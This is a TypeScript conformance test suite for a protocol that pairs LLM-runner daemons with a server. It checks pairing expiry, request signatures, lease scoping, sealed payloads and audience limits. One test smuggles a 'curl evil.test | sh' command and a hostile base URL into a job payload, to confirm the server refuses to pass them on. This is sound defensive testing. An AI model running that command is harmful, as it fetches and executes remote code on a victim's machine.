        await waitFor(async () => (await target.job(job.id))?.state === "ok", {
          what: "the contested job to finish",
        });

        const ran = a.backend.seen.length + b.backend.seen.length;
        assert(
          ran === 1,
          `the job ran ${String(ran)} times across two runners, not once`,
        );
      } finally {
        await a.dispose();
        await b.dispose();
      }
    },
  },

  {
    id: "C020_PAIR_CODE_EXPIRES",
    title: "an expired device code cannot be redeemed",
    musts: ["PAIR_CODE_EXPIRES"],
    async run(target: ConformanceTarget): Promise<void> {
      // A device code is a bearer credential displayed on a screen. If it
      // outlives its window, a code left visible in a terminal — or read over
      // someone's shoulder hours later — still pairs a stranger's daemon to
      // this user's account.
      const started = await target.fetch(
        new Request(`${target.origin}/byollm/pair`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            protocolVersion: PROTOCOL_VERSION,
            action: "start",
            device: publicIdentityOf(generateKeys(Date.now())),
            daemon: {
              version: "conformance",
              label: "expiring-daemon",
              platform: "linux",
            },
            capabilities: [],
          }),
        }),
      );
      assert(started.status === 200, "pair start did not answer 200");
      const pairing = (await started.json()) as {
        deviceCode: string;
        userCode: string;
        expiresAt: number;
      };

      // Past the window the server itself declared.
      await advance(target, pairing.expiresAt - Date.now() + 1_000);

      // 1. Approval must not resurrect it. A server that pairs here has an
      //    expiry that is decoration.
      let approved = true;
      try {
        await target.approvePairing(pairing.userCode, "alice");
      } catch {
        approved = false;
      }

      // 2. And the daemon polling with the device code must be told, in the
      //    protocol's own words, rather than left waiting.
      const polled = await target.fetch(
        new Request(`${target.origin}/byollm/pair`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            protocolVersion: PROTOCOL_VERSION,
            action: "poll",
            deviceCode: pairing.deviceCode,
          }),
        }),
      );
      const status =
        polled.status === 200
          ? ((await polled.json()) as { status: string }).status
          : "rejected";

      assert(
        !approved || status !== "approved",
        "an expired device code still paired a runner",
      );
      assert(
        status === "expired" || status === "denied" || status === "rejected",
        `polling an expired code answered "${status}"`,
      );
    },
  },

  {
    id: "C021_CAPABILITY_IS_DETECTED",
    title: "a runner advertises only what is installed and healthy",
    musts: ["CAPABILITY_IS_DETECTED"],
    async run(target: ConformanceTarget): Promise<void> {
      // Config is a wish; the matrix must be the intersection of the wish and
      // reality. A daemon that advertises what its config names would have
      // the server route work to a machine that cannot run it — and the app
      // would wait for a result nobody is producing, which is exactly the
      // failure `NO_RUNNER_SIGNAL` exists to prevent.
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        // Configured, but the model is not there.
        daemon.backend.healthy = false;
        const advertised = await daemon.runner.detectCapabilities();
        assert(
          advertised.length === 0,
          `an unhealthy backend advertised ${String(advertised.length)} capabilities`,
        );

        // Healthy, but serving a different model than the config names.
        daemon.backend.healthy = true;
        daemon.backend.models = ["some-other-model"];
        const wrongModel = await daemon.runner.detectCapabilities();
        assert(
          wrongModel.length === 0,
          "a backend without the configured model still advertised it",
        );

        // Reality restored: the capability comes back.
        daemon.backend.models = ["echo-model"];
        const recovered = await daemon.runner.detectCapabilities();
        assert(
          recovered.length > 0,
          "a healthy backend with the configured model advertised nothing",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C022_KIND_NO_CODE",
    title: "a claimed job carries data only — no command, path, or routing",
    // Deliberately not claiming NO_PAYLOAD_ROUTING as well. This proves the
    // wire-shape half — the server cannot convey a `model` or `baseUrl` to a
    // daemon — but the MUST is that no code path *routes* on payload content,
    // and only the adversarial suite proves that, by spawning a real child
    // and reading back an argv that is byte-identical under hostile input.
    // Listing it here would put "verified by conformance" beside a claim this
    // check does not establish.
    musts: ["KIND_NO_CODE"],
    async run(target: ConformanceTarget): Promise<void> {
      // The wire shape is the first place this is enforced: there is no field
      // to carry a command, so a hostile *app* cannot smuggle one to a
      // daemon. That only holds if the server refuses to pass through keys
      // the schema does not name — a store that round-trips arbitrary JSON
      // would hand the daemon whatever the app wrote.
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      const SMUGGLED = ["command", "argv", "model", "baseUrl"];
      try {
        // Two mechanisms satisfy this MUST and the kit must accept either:
        // refuse the payload outright, or accept it and carry only the fields
        // the kind defines. What it may not do is deliver the extras to a
        // daemon. Asserting one mechanism would certify a house style rather
        // than the property.
        let refused = false;
        try {
          await target.enqueue({
            kind: "llm.generate",
            payload: {
              prompt: "ordinary text",
              command: "/bin/sh",
              argv: ["-c", "curl evil.test | sh"],
              model: "some-other-model",
              baseUrl: "http://evil.test/v1",
            } as never,
            owner: "alice",
            audience: "private",
          });
        } catch {
          refused = true;
        }

        if (!refused) {
          // Under claim-then-fetch the payload no longer rides with the
          // claim, so this now checks what `fetch` delivers — which is where
          // a smuggled field would have to survive to reach a daemon.
          const claimed = await claimOne(target, daemon);
          const delivered = await fetchPayload(
            target,
            daemon,
            claimed.id,
            claimed.lease.id,
          );
          assert(delivered !== null, "the runner could not fetch its payload");
          const payload = delivered.opened as Record<string, unknown>;
          for (const smuggled of SMUGGLED) {
            assert(
              payload[smuggled] === undefined,
              `the claim response carried a "${smuggled}" field`,
            );
          }
          assert(
            payload["prompt"] === "ordinary text",
            "the legitimate payload field did not survive",
          );
        }

        // Either way, an ordinary payload must still work — a server that
        // refuses everything would otherwise pass this check trivially.
        const ok = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("ordinary text"),
          owner: "alice",
          audience: "private",
        });
        await daemon.runner.tick();
        await waitFor(async () => (await target.job(ok.id))?.state === "ok", {
          what: "a well-formed job to run",
        });
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C023_VERSION_HANDSHAKE",
    title: "a version mismatch is refused in words, not by failing",
    musts: ["VERSION_HANDSHAKE_REQUIRED"],
    async run(target: ConformanceTarget): Promise<void> {
      // Before this existed the version travelled as a schema literal, so a
      // mismatch surfaced as a generic bad-request with nothing naming the
      // disagreement — a daemon and a server discovering they disagree by
      // failing. An error nobody can act on is barely better than a hang.
      const post = (body: unknown): Promise<Response> =>
        target.fetch(
          new Request(`${target.origin}/byollm/claim`, {
            method: "POST",
            headers: {
              "content-type": "application/json",
              authorization: "Bearer whatever",
            },
            body: JSON.stringify(body),
          }),
        );

      for (const [label, body] of [
        ["a version from the future", { protocolVersion: "99", max: 1 }],
        ["no version at all", { max: 1 }],
        ["a non-string version", { protocolVersion: 0, max: 1 }],
      ] as const) {
        const response = await post(body);
        const parsed = (await response.json()) as {
          error?: string;
          message?: string;
          supported?: string[];
        };

        assert(
          parsed.error === "unsupported-protocol-version",
          `${label}: answered "${parsed.error ?? "nothing"}" rather than unsupported-protocol-version`,
        );
        assert(
          Array.isArray(parsed.supported) && parsed.supported.length > 0,
          `${label}: the refusal did not say what the server supports`,
        );
        // The message is the part a human acts on, so it has to carry
        // something actionable rather than restating the code.
        assert(
          (parsed.message ?? "").length > 20,
          `${label}: the refusal carried no usable message`,
        );
      }

      // The version check must not become a way past authentication: a
      // well-versioned request with a bad token is still refused.
      const authed = await post({ protocolVersion: PROTOCOL_VERSION, max: 1 });
      assert(
        authed.status === 400 || authed.status === 401,
        `a supported version with a bad token answered ${String(authed.status)}`,
      );
    },
  },

  {
    id: "C024_KEY_EXCHANGE",
    title:
      "pairing exchanges identities, verifies them, and reveals nothing early",
    musts: ["KEYS_EXCHANGED_AT_CONSENT"],
    async run(target: ConformanceTarget): Promise<void> {
      const start = async (device: unknown): Promise<Response> =>
        target.fetch(
          new Request(`${target.origin}/byollm/pair`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({
              protocolVersion: PROTOCOL_VERSION,
              action: "start",
              daemon: {
                version: "conformance",
                label: "key-exchange",
                platform: "linux",
              },
              device,
              capabilities: [],
            }),
          }),
        );

      // 1. A device whose encryption key is not signed by the identity it
      //    presents must be refused. Accepting it would let a caller pair a
      //    real identity with a key it holds the secret for, and read
      //    everything later sealed to that runner.
      const honest = publicIdentityOf(generateKeys(Date.now()));
      const attacker = publicIdentityOf(generateKeys(Date.now()));
      const forged = await start({
        ...honest,
        encryption: attacker.encryption,
      });
      assert(
        forged.status >= 400,
        `a device with an unsigned encryption key paired anyway (${String(forged.status)})`,
      );

      // 2. An honest device starts a pairing.
      const started = await start(honest);
      assert(
        started.status === 200,
        "an honest device could not start pairing",
      );
      const pairing = (await started.json()) as {
        deviceCode: string;
        userCode: string;
      };

      const poll = async (): Promise<Record<string, unknown>> => {
        const response = await target.fetch(
          new Request(`${target.origin}/byollm/pair`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({
              protocolVersion: PROTOCOL_VERSION,
              action: "poll",
              deviceCode: pairing.deviceCode,
            }),
          }),
        );
        return (await response.json()) as Record<string, unknown>;
      };

      // 3. Before approval, nothing. An unapproved code must not be a way to
      //    enumerate a site's keys.
      const pending = await poll();
      assert(
        pending["sites"] === undefined,
        "a pending poll disclosed the site's keys before anyone approved",
      );

      // 4. After approval, the site's identity arrives and verifies.
      await target.approvePairing(pairing.userCode, "alice");
      const approved = await poll();
      assert(
        approved["status"] === "approved",
        `poll after approval said "${String(approved["status"])}"`,
      );

      // The set this pairing covers — cloud_009 §5. A direct site answers
      // with one entry, and this check pairs against one, so what it verifies
      // is every key it was handed rather than the first: an upstream that
      // slipped one unverifiable site into a set would otherwise pass by
      // being asked about the other.
      const offered = approved["sites"];
      assert(
        typeof offered === "object" && offered !== null,
        "the approval carried no sites to pin",
      );
      const parsed = Object.values(offered as Record<string, unknown>).map(
        (value) => PublicIdentity.safeParse(value),
      );
      assert(
        parsed.length > 0 && parsed.every((entry) => entry.success),
        "the approval carried no usable site identity",
      );
      const site = parsed[0]!;
      assert(
        verifyPublicIdentity(site.data),
        "the site's encryption key is not signed by the identity it presented",
      );
    },
  },

  {
    id: "C025_SIGNED_REQUESTS",
    title: "authentication is a signature over the request, not a secret",
    musts: ["REQUESTS_SIGNED_NOT_BEARER"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        const body = JSON.stringify({
          protocolVersion: PROTOCOL_VERSION,
          runnerId: daemon.runnerId,
          capabilities: await daemon.runner.detectCapabilities(),
          max: 1,
        });

        const post = (headers: Record<string, string>): Promise<Response> =>
          target.fetch(
            new Request(`${target.origin}/byollm/claim`, {
              method: "POST",
              headers: { "content-type": "application/json", ...headers },
              body,
            }),
          );

        const sign = (over: Partial<{ body: string; endpoint: string }> = {}) =>
          signRequest(daemon.keys, {
            endpoint: over.endpoint ?? "claim",
            runnerId: daemon.runnerId,
            issuedAt: Date.now(),
            body: over.body ?? body,
          });

        const headersFor = (s: {
          runnerId: string;
          issuedAt: number;
          signature: string;
        }): Record<string, string> => ({
          "x-byollm-runner": s.runnerId,
          "x-byollm-issued-at": String(s.issuedAt),
          "x-byollm-signature": s.signature,
        });

        // A correct signature is accepted.
        assert(
          (await post(headersFor(sign()))).status === 200,
          "a correctly signed request was refused",
        );

        // No signature at all.
        assert(
          (await post({})).status === 401,
          "an unsigned request was accepted",
        );

        // A signature over a different body. This is the one that matters:
        // without it an intermediary can keep a valid signature and change
        // what the request asks for.
        assert(
          (await post(headersFor(sign({ body: '{"other":true}' })))).status ===
            401,
          "a signature over different bytes was accepted",
        );

        // A signature made for another endpoint, replayed here.
        assert(
          (await post(headersFor(sign({ endpoint: "release" })))).status ===
            401,
          "a signature for another endpoint was accepted",
        );

        // A signature from a key nobody pinned.
        const stranger = signRequest(generateKeys(Date.now()), {
          endpoint: "claim",
          runnerId: daemon.runnerId,
          issuedAt: Date.now(),
          body,
        });
        assert(
          (await post(headersFor(stranger))).status === 401,
          "a signature from an unpinned key was accepted",
        );

        // And a stale one, well outside any reasonable clock skew.
        const stale = signRequest(daemon.keys, {
          endpoint: "claim",
          runnerId: daemon.runnerId,
          issuedAt: Date.now() - 86_400_000,
          body,
        });
        assert(
          (await post(headersFor(stale))).status === 401,
          "a signature from a day ago was accepted",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C026_LEASE_SCOPED_RELEASE",
    title: "a release acts on the lease it names, not whatever lease exists",
    musts: ["LEASE_SCOPED_BY_GRANT"],
    async run(target: ConformanceTarget): Promise<void> {
      // A signed request is replayable inside its freshness window. That is
      // safe only where the endpoint is idempotent *per addressed instance* —
      // and a release naming a job and a runner names neither uniquely, since
      // both survive a claim-release-reclaim cycle. A replayed release then
      // drops a later grant while the daemon is still executing, and the
      // owner's compute runs the job twice.
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("run me once"),
          owner: "alice",
          audience: "private",
        });

        const first = await claimOne(target, daemon);
        assert(
          typeof first.lease.id === "string" && first.lease.id.length > 0,
          "a claimed job arrived without a lease id — nothing can be scoped to it",
        );

        await releaseLease(target, daemon, job.id, first.lease.id);

        const second = await claimOne(target, daemon);
        assert(
          second.lease.id !== first.lease.id,
          "re-claiming the same job reused the lease id, so the two grants are indistinguishable",
        );

        // Replay the first release. It must not touch the second grant.
        await releaseLease(target, daemon, job.id, first.lease.id);

        const state = await target.job(job.id);
        assert(
          state?.state === "claimed" || state?.state === "running",
          `a replayed release returned the job to "${String(state?.state)}" while it was held`,
        );

        // And the current grant can still be released, so this is not a
        // no-op dressed as a fix.
        await releaseLease(target, daemon, job.id, second.lease.id);
        assert(
          (await target.job(job.id))?.state === "queued",
          "releasing the current lease did not return the job to the queue",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C027_CLAIM_ANSWERS_WITH_STUBS",
    title: "a claim carries routing metadata and no work",
    musts: ["STUB_METADATA_EXHAUSTIVE"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        await target.enqueue({
          kind: "llm.generate",
          payload: prompt("this must not appear in a claim response"),
          owner: "alice",
          audience: "private",
        });

        const stub = await claimOne(target, daemon);
        const asRecord = stub as unknown as Record<string, unknown>;

        // 1. No work in the claim. This is the property: an upstream routes
        //    without reading, so the payload cannot ride along with routing.
        assert(
          asRecord["payload"] === undefined,
          "the claim response carried the payload",
        );
        assert(
          !JSON.stringify(stub).includes("this must not appear"),
          "the prompt text appeared somewhere in the claim response",
        );

        // 2. Exactly the enumerated fields, and nothing invented. A field an
        //    upstream is not supposed to see is a leak whether or not anyone
        //    reads it today.
        const parsed = ClaimedStub.safeParse(stub);
        assert(
          parsed.success,
          `the claim response is not a valid stub: ${parsed.success ? "" : parsed.error.issues.map((i) => i.path.join(".")).join(", ")}`,
        );

        // 3. The size class is a bucket, not a measurement.
        assert(
          ["small", "medium", "large", "unbounded"].includes(
            String(asRecord["sizeClass"]),
          ),
          `sizeClass was "${String(asRecord["sizeClass"])}"`,
        );

        // 4. And the work is collectable by the device that holds the lease.
        const fetched = await fetchPayload(
          target,
          daemon,
          stub.id,
          stub.lease.id,
        );
        assert(fetched !== null, "the lease holder could not fetch its work");
        // Sealed on the wire, readable once opened by the device it was
        // sealed to. Both halves matter.
        assert(
          !JSON.stringify(fetched.raw).includes("this must not appear"),
          "the payload crossed the wire in the clear",
        );
        assert(
          JSON.stringify(fetched.opened).includes("this must not appear"),
          "the runner holding the lease could not open its own work",
        );

        // 5. But not under a lease that is not held.
        const wrong = await fetchPayload(
          target,
          daemon,
          stub.id,
          "lease-that-does-not-exist",
        );
        assert(
          wrong === null,
          "fetch answered for a lease this runner does not hold",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C028_STORED_WORK_IS_SEALED",
    title: "the store holds ciphertext, and a wrong-key envelope is refused",
    musts: ["ENVELOPE_SEALED_AND_SIGNED"],
    async run(target: ConformanceTarget): Promise<void> {
      const secret = "a prompt nobody should read from storage";
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt(secret),
          owner: "alice",
          audience: "private",
        });

        // 1. Whatever the store hands back about this job, the work is not
        //    legible in it. This is §10's at-rest property, and it is the one
        //    a database backup or a support engineer actually meets.
        const stored = await target.job(job.id);
        assert(
          !JSON.stringify(stored ?? {}).includes(secret),
          "the prompt was readable in the stored job",
        );

        // 2. The endpoint can still open its own work and hand it over.
        const stub = await claimOne(target, daemon);
        const delivered = await fetchPayload(
          target,
          daemon,
          stub.id,
          stub.lease.id,
        );
        assert(delivered !== null, "the lease holder could not fetch its work");
        assert(
          !JSON.stringify(delivered.raw).includes(secret),
          "the work crossed the wire in the clear",
        );
        assert(
          JSON.stringify(delivered.opened).includes(secret),
          "the device could not open work sealed to it",
        );

        // Deliberately *not* asserted here: that a wrong-key envelope is
        // refused. Testing `open()` directly would test the primitive, which
        // `envelope.test.ts` already covers, and would pass whether or not
        // this server acted on the refusal — a mutation disabling the
        // server's check went unnoticed, which is how that was found. The
        // server-side property needs an envelope this site did not seal, and
        // reaching that over the wire needs store access the kit does not
        // have. Recorded in MUTATIONS.md rather than left as a check that
        // does not bite.
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C029_DAEMON_REFUSES_UNSIGNED_WORK",
    title: "a daemon refuses work not signed by the site it pinned",
    musts: ["ENVELOPE_SEALED_AND_SIGNED"],
    async run(target: ConformanceTarget): Promise<void> {
      // The gap MUTATIONS.md recorded, now closable. Once the site seals to
      // the *device*, the daemon is an opener too — so the kit can hand it an
      // envelope nobody it trusts signed, which is exactly what a relay
      // substituting work would look like.
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        const keys = await daemon.identityKeys();
        const relay = generateKeys(Date.now());

        // Perfectly well-formed, perfectly openable, and signed by a key this
        // daemon never pinned. `crypto_box_seal` is anonymous-sender, so
        // producing this needs nothing but the device's public key.
        const forged = await seal({
          plaintext: JSON.stringify({ prompt: "run this instead" }),
          senderKeys: relay,
          recipientEncryptionPublic: keys.encryptionPublic,
          context: {
            jobId: "job_anything",
            senderKeyId: keyId(daemon.sitePinned.identity),
            recipientKeyId: keyId(publicIdentityOf(keys).identity),
            deadlineAt: Date.now() + ENVELOPE_MAX_AGE_MS,
            direction: "payload",
          },
        });

        const opened = await open({
          envelope: forged,
          recipientKeys: keys,
          senderIdentityPublic: daemon.sitePinned.identity,
          expected: {
            jobId: "job_anything",
            senderKeyId: keyId(daemon.sitePinned.identity),
            recipientKeyId: keyId(publicIdentityOf(keys).identity),
            direction: "payload",
          },
        });

        assert(
          !opened.ok,
          "a daemon accepted work signed by a key it never pinned",
        );
        assert(
          opened.reason === "bad-signature",
          `refused for "${opened.reason}", not the signature — which is the property here`,
        );

        // And the same envelope, signed by the site, is accepted — so this is
        // not a check that refuses everything.
        const genuine = await fetchGenuine(target, daemon);
        assert(genuine, "a daemon could not open work its own site sealed");
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C030_SITE_REFUSES_UNSIGNED_RESULTS",
    title: "a site refuses a result not signed by the device that ran it",
    // The proof-of-possession half of `PROVENANCE_NAMES_DEVICE`: attribution
    // by a signature that verifies against the device the lease was granted
    // to, rather than by a key id carried beside the result. Carrying an id
    // is not proving possession, and a forger writes whatever it likes.
    musts: ["ENVELOPE_SEALED_AND_SIGNED", "PROVENANCE_NAMES_DEVICE"],
    async run(target: ConformanceTarget): Promise<void> {
      // The return leg of C029. `ENVELOPE_SEALED_AND_SIGNED` says "every
      // payload *and result*", and until this check existed only half of that
      // sentence was tested — an implementation could seal work to the device
      // and accept whatever came back.
      //
      // Driven through the `result` endpoint rather than through `open()`,
      // because the primitive already has unit tests and the question here is
      // whether the endpoint uses it. That distinction is what made C028 fail
      // to bite.
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: { prompt: "who signed this" },
          owner: "alice",
        });
        const claimed = await claimOne(target, daemon);
        assert(claimed.id === job.id, "the harness could not claim its job");

        // Signed by a key the site never approved, sealed to the site, and
        // delivered over a request the *genuine* device signed — a relay that
        // holds a live session and substitutes the answer.
        const relay = generateKeys(Date.now());
        const forged = await postResult(target, daemon, {
          jobId: job.id,
          leaseId: claimed.lease.id,
          outcome: { outcome: "ok", text: "an answer the device never gave" },
          sealWith: relay,
        });
        assert(
          forged.status !== 200,
          "a site accepted a result signed by a key it never approved",
        );

        // And the job is untouched — refused, not half-applied.
        const afterForgery = await target.job(job.id);
        assert(
          afterForgery?.outcome === undefined,
          "a refused result still reached the app",
        );

        // The same result, sealed by the device, is accepted — so this is not
        // a check that refuses everything.
        const real = await postResult(target, daemon, {
          jobId: job.id,
          leaseId: claimed.lease.id,
          outcome: { outcome: "ok", text: "the genuine answer" },
        });
        assert(
          real.status === 200,
          `a site refused a result its own device sealed (${String(real.status)})`,
        );

        // A daemon that seals an error and declares `ok` is the other half:
        // the clear-text disposition is a routing hint, and believing it would
        // let the wire contradict the envelope.
        const lying = await postResult(target, daemon, {
          jobId: job.id,
          leaseId: claimed.lease.id,
          outcome: {
            outcome: "error",
            code: "backend-error",
            message: "it actually failed",
            retryable: false,
          },
          disposition: "ok",
        });
        assert(
          lying.status !== 200,
          "a site believed a disposition the sealed outcome contradicted",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C032_SERVER_REFUSES_TO_OFFER",
    title: "a claim is not answered with work the claimer may not run",
    musts: ["AUDIENCE_BOTH_SIDES"],
    async run(target: ConformanceTarget): Promise<void> {
      // cloud_008 Tier 3, finding 10 — and the finding was understated. The
      // **entire kit** passes with server-side audience enforcement deleted:
      // all thirty-odd checks, green, against a server that offers every job
      // to every daemon.
      //
      // Not one bad check. A structural blind spot: every other check drives
      // a real daemon, and a daemon refuses locally, so "the job did not run"
      // looks identical whether the server declined to offer it or the device
      // declined to take it. `AUDIENCE_BOTH_SIDES` is the MUST that says
      // *both* sides enforce, and the kit could only ever see one.
      //
      // This claims over the raw protocol instead. No daemon admission logic
      // runs, so what comes back is exactly what the server was willing to
      // hand over — which is the half nothing else observes.
      const bob = await pairDaemon(target, { owner: "bob", offer: "team" });
      try {
        const priv = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("alice's own machines only"),
          owner: "alice",
          audience: "private",
        });

        const offered = await claimRaw(target, bob);
        assert(
          !offered.some((job) => job.id === priv.id),
          "a server offered a `self` job to a device its owner does not own",
        );

        // The positive control, and it is the whole reason this check is not
        // "assert the claim is empty": a server that offered nothing would
        // pass the assertion above and route no work at all.
        const shared = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("anyone may run this"),
          owner: "alice",
          audience: "team",
        });
        const second = await claimRaw(target, bob);
        assert(
          second.some((job) => job.id === shared.id),
          "a server withheld a `public` job from a public-offering device",
        );
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C031_ROSTER_NOT_DISCLOSED",
    title: "a claimed stub carries no list of who may run the job",
    musts: ["ROSTER_NOT_DISCLOSED"],
    async run(target: ConformanceTarget): Promise<void> {
      // Checkable at all only since cloud_008 §0.2. The property used to be
      // "a site should not publish membership", which nothing could observe;
      // taking `audienceAllow` off the stub made it "no wire message carries
      // membership", which a serialised stub answers directly.
      //
      // Worth writing precisely rather than generously, because this MUST was
      // cited in code comments, in relay tests and in two specs as though it
      // were enforced data while having no registry entry and no check at all.
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("who else is on this roster"),
          owner: "alice",
          audience: "team",
          // The site restricts the job to people who are not this daemon's
          // owner. A stub that carried the list would be handing a routing
          // party the membership of alice's group.
          audienceAllow: ["alice", "carol", "erin"],
        });

        const claimed = await claimOne(target, daemon);
        assert(
          claimed.id === job.id,
          "the harness could not claim its own named job",
        );

        // The enforcement, and it is target-agnostic: a claimed stub parses
        // as `ClaimedStub`, which is `.strict()` and has no field for
        // membership. There is nowhere to put a roster, so there is no
        // decision an implementation could get wrong.
        const asRecord = claimed as unknown as Record<string, unknown>;
        assert(
          asRecord["audienceAllow"] === undefined,
          "a claimed stub carried audienceAllow",
        );
        const parsed = ClaimedStub.safeParse(claimed);
        assert(
          parsed.success,
          "the claim response is not a valid stub, so its fields prove nothing",
        );

        // And a scan for the names themselves, which is the weaker check and
        // is honest about why: a target may translate owner identifiers on
        // the way in — the Supabase adapter maps names to user rows — so
        // finding nothing here does not prove much on its own. It costs
        // nothing and catches a target that passes the names through under
        // some other key.
        const wire = JSON.stringify(claimed);
        for (const member of ["carol", "erin"]) {
          assert(
            !wire.includes(member),
            `a claimed stub disclosed roster member "${member}"`,
          );
        }

        // The stub is otherwise intact — "send nothing" would pass every
        // assertion above and break every route. Asserted on the fields
        // routing actually needs rather than on the owner's spelling, which
        // is a target's business: the harness asked for `named`, and a
        // claimed job must still say so.
        assert(
          claimed.audience === "team",
          "the stub lost the audience routing decides on",
        );
        assert(
          typeof claimed.owner === "string" && claimed.owner.length > 0,
          "the stub lost the owner",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },
];
